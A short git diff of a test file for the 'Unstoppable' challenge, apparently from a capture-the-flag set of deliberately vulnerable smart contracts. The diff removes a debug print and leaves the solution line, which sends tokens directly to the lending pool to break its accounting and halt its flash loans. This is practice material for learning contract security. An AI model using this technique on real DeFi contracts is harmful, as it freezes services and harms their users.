@@ -40,7 +40,6 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        console.log(this.token.connect, 'asdf');
         // let DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         // let token = DamnValuableTokenFactory.attach(this.token.address);
         this.token.connect(attacker).transfer(this.pool.address, 10);
